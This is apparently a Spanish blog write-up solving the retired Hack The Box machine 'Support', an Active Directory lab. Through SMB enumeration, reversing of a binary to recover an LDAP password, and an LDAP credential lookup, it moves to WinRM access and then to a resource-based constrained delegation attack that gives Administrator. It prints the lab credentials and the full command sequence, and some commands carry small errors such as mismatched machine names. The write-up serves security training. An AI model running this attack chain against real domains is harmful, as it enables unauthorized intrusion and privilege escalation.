---
title: "WriteUp Machine - Support [INACTIVA]"
excerpt: "Resolucion de la maquina de Hack The Box 'Support' - Session X"
header:
  teaser: "/assets/images/Support.png"
categories:
  - WriteUp
---
## ¿Que es AD?

En primer lugar, **AD (Active Directory) es una tecnología diseñada por Microsoft** e introducida en Windows 2000 Server  cuyo objetivo es el de definir un conjunto de **componentes centralizados** que se encargan de **almacenar, organizar y distribuir información a las máquinas que hacen parte de una red de ordenadores**. Para que exista un AD, es necesario contar con ordenadores que tengan una versión «Server» de Windows, los cuales se encargarán precisamente de mantener la información del entorno. Ahora bien, la información que se guarda en estos servidores se compone de unidades llamadas objetos y pueden ser prácticamente cualquier cosa: Usuarios, ordenadores, grupos, unidades organizativas, servicios, etc.

## Fase de reconocimiento 

Verificaremos si la maquina esta encendida y tenemos conexión con ella.

```bash
ping -c 1 10.10.11.174
```

Sabemos que es Windows por tu TTL -> 128 (Windows) - 64 (Linux)
Empezaremos metiéndole un nmap para poder hacer un reconocimiento de sus puertos y los servicios que están corriendo por el mismo. 

```bash
nmap -p- --open -sS -sCV --min-rate 5000 10.10.11.174 -oN info_basic
```

```bash
rustscan --ulimit=5000 --range=1-65535 -a 10.129.11.32 -- -A -sc -oN
```


Por medio del 445 sabemos que corre SBM, usando la herramienta SBM client/smbmap podemos probar un null session para poder listar los recursos compartidos a nivel de red del lado de la maquina.

```bash
smbmap -H 10.10.11.174 -u name 
```

nos llama la atencion support-tools así que descargarnos los recursos existentes.

Como parte del reconocimiento debemos saber ante que no enfrentamos, entonces usamos crackmapexec para enumerar el servicio SMB 

```bash
crackmapexec smb 10.10.11.174
```

vamos directamente a editar el /etc/hosts a fin de no tener problemas por si el tema va con Kerberos.

Para los que no sepan el /etc/hosts básicamente, permite a un sistema resolver nombres de dominio en direcciones IP sin necesidad de conectarse a un servidor DNS externo.

```bash
10.10.11.174 dc dc.support.htb support.htb
```

Ahora ya nos debería resolver los dominios contemplados.

## Fase de explotación

Nos conectaremos al servicio smb usando la null session encontrada para poder descargarnos los archivos para saber si existe algo interesante.

```bash
smbclient //10.10.11.174/support-tools -N 
```

vamos a descargarnos UserInfo.exe.zip

```bash
get UserInfo.exe.zip
```

vamos a nuestra maquina y lo descomprimimos para saber que tenemos y nos vamos a revisar a ver si existe algo de utilidad.

vamos entonces a centrarnos en el archivo UserInfo.exe que es un binario para Windows usaremos string para poder las cadenas de carcateres imprimibles

```bash
strings -e l UserInfo.exe
```

Notamos que parece tramitar consultas a los servicio de LDAP y sabemos que Kerberos esta expuesto.

Por ello buscaremos Kerburter que esta hecho en Go y le hechamos un ` go build . ` para poder usarlo, lo que haremos es comprobar la existencia de usuarios

```bash
./kerbrute userenum -d support.htb --dc 10.10.11.174 users 
```

```bash
./kerbrute userenum -d support.htb --dc 10.10.11.174 /usr/src/SecLists/Usernames/xato-net-10-million-usernames.txt
```

Entonces podemos enumerar usuarios validos, a nos que nos bloquen.

Siempre en AD nosotros podemos intentar con una serie de usuarios validos un as-rep roast attack:

Kerberos es un protocolo de autenticación de red que proporciona un método seguro para la verificación de identidad entre clientes y servidores en una red informática.

Un AS-REP Roast Attack explota una debilidad en la forma en que el protocolo Kerberos maneja las solicitudes de autenticación. En lugar de enviar una solicitud TGT completa, el atacante envía una solicitud AS-REQ solicitando un TGT sin proporcionar las credenciales del usuario. Si el servidor acepta estas solicitudes AS-REQ, devuelve un TGT cifrado con la clave de sesión del usuario. y nosotros como atacante podemos recopilar estos TGT cifrados y luego intentar descifrarlos sin la necesidad de conocer las contraseñas de los usuarios.

Sim embargo la verdad aunque esto es una alternativa, aquí no contamos con la configuración seteada de DONT RIQUAI PRECAUP  de kerberos.

Por el momento vamos a analizar el .exe para ello, vamos a llevarnos esto a mi maquina Windows

Vamos a abrir un servidor HTTP con Python para poder pasarnos la información.

```bash
python3 -m http.server 80
```

Y lo abrimos en la maquina Windows, simplemente con el navegador y nos descargamos el archivo.

```bash
http://192.168.100.23/
```

Podemos ver como funciona porque esto será útil para luego poder probar el programa

```bash
.\UserInfo.exe
```

E instalaremos dnSpy para poder ver como funciona el programa a bajo a nivel, existen herramientas mas potentes pero por el momento y para la comprensión de todos usare dnSpy por su simplicidad de uso.

Iremos directo a 

```bash
https://github.com/dnSpy/dnSpy
```

lo descargamos e instalamos. Abrimos el archivo y vamos ver las consultad LDAP

Al parecer esto esta haciendo unas cosas raras con la contraseña a fin de que no se vea en texto claro y tenemos muchas alternativas para poder verla, pero me iré por usar BreakPoints para poder controlar el flujo del programa.

Usaremos la consulta:

```bash
find -firts * -last *
```

F10 -> paso siguiente
F5 -> Ejecutar Binario
F9 -> BreakPoint

Obtenemos `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` y como sabemos que el usuario LDAP existe 
Para comprobar el uso de esta key podemos usar 

```bash
crackmapexec winrm 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Podríamos intentar el Kerberos Grantyn atack pero no obtendríamos nada.

Aqui tenemos muchas opciones, pero nosotros como ya tenemos el usuario y la contraseña para LDAP, ahora podemos intentar enumerarlo. Podemos utilizar herramientas como ldapsearch para hacerlo.

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | tee ldapsearch.log
```

encontramos:

```bash
Ironside47pleasure40Watchful
```

Que le pertenece al usuario support.
Ahora podemos intentar sin hacer validación, conectarnos a winrm mediante evil-winrm para probar si la contraseña es correcta.

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep -i "samaccountname: support" -B 40
```

Entonces como tenemos el puerto 5985 podemos usarlo, pues pertenece al servicio de administración remota de Windows, y podríamos usar evilWinrm, y conectarnos a la maquina, pero antes deberíamos validarlo  para saber si de entrada es correcto lo que hemos hecho.

```bash
crackmapexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
```

y como nos pone un "pwned!" sabemos que es valido.

```bash
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

nos conectamos y podemos ver la flag del usuario.

## Escalada de Privilegios.

Para empezar la escalada, podemos realizar otra ves un par de revisiones para saber por donde podríamos efectuarla. 

por lo cual metemos:

```bash
whoami /priv
```

NADA..

```bash
net user support
```

```bash
net grupo
```

y observamos que tenemos un parámetro peculiar el 

```bash
Local Group Memberships      *Remote Management Use
```

Ahora que estamos dentro, podemos intentar usar Bloodhound para una mayor enumeración. Bloodhound nos hace la vida más fácil porque puede brindarnos visualización de las relaciones dentro de un entorno de Active Directory.

![](/assets/images/Support1.png)

Este grafico puede ser un poco confuso para aquellos que no han topado AD, pero debeemos saber que:

Como somos usuarios de soport, estamos dentro de CUENTA DE SOPORTE COMPARTIDO@support.htb. También podemos verlo ejecutando el soporte Get-ADPrincipalGroupMembership en Powershell.

```bash
Get-ADPrincipalGroupMembership support
```

con esto vemos el parametro `distinguishedName : CN=Shared Support Accounts,CN=Users,DC=support,DC=htb` y esto nos dice que obtuvimos el permiso GenericAll para el controlador de dominio dc.support.htb, lo que significa que tenemos todos los derechos sobre el objeto dc.support.htb.

Entonces lo que efectuaremos ahora es un Resource-based Constrained Delegation attack.

Fuera de lo que estamos haciendo por explicar un poco el concepto de esto:

En el protocolo Kerberos, la delegación restringida permite que un servicio, por ejemplo, un servidor web, actúe en nombre de un usuario para acceder a recursos en otro servidor en su nombre, sin necesidad de que el usuario proporcione sus credenciales. .

Sin embargo, un ataque de delegación restringida basada en recursos ocurre cuando un atacante explota una configuración insegura en un sistema que permite la delegación de credenciales a un recurso específico, como una base de datos o un servidor de archivos. El atacante aprovecha esta debilidad para obtener acceso no autorizado a otros recursos dentro del sistema o la red, comprometiendo así la seguridad de la infraestructura.

Nos apoyaremos en hacktricks para hacer esto:

```bash
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
```

entonces lo primero es instalar y obtener lo que necesitamos, por un lado Powermad y Powerview.

Descargamos el RAW del Powermad en nuestro equipo:

```bash
wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
```

Agregamos a la maquina victima el Powermad

```bash
upload  /Powermad.ps1
```

Lo vamos a ejecutar

```bash
Import-Module .\Powermad.ps1
```

vamos a usar el Powerview para enumerar la parte del AD:

```bash
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

lo traremos a la maquina nuestra:

```bash
wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

y  lo cargaremos en la maquina Windows:

```bash
upload /PowerView.ps1
```

finalmente lo vamos a ejecutar:

```bash
Import-Module .\PowerView.ps1
```

y vamos a empezar con el proceso, los proximos comandos simplemente se ejecutan desde a maquina victima:

```bash
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
Get-DomainComputer SERVICEA
```

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
```

```bash
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
```

```bash
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```bash
$SD.GetBinaryForm($SDBytes, 0)
```

```bash
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

```bash
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/SERVICEA$:123456
```

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
impacket-psexec -k dc.support.htb
```
y wuala... seremos usuarios Administrator.


